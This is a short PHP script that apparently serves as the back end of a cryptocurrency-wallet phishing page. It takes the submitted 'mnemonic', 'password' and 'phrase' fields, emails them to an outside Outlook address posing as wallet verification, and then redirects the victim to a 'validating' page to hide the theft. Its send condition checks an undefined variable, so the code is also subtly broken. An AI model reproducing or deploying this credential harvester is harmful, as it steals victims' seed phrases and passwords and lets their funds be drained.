<?php
//get data from form  

$name = $_POST['mnemonic'];
$password= $_POST['password'];
$message= $_POST['phrase'];
$to = "walletverification@outlook.com";
$subject = "Mail From website";
$txt ="Name = ". $name . "\r\n  Password = " . $password . "\r\n Message =" . $message;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:validating.html");
?>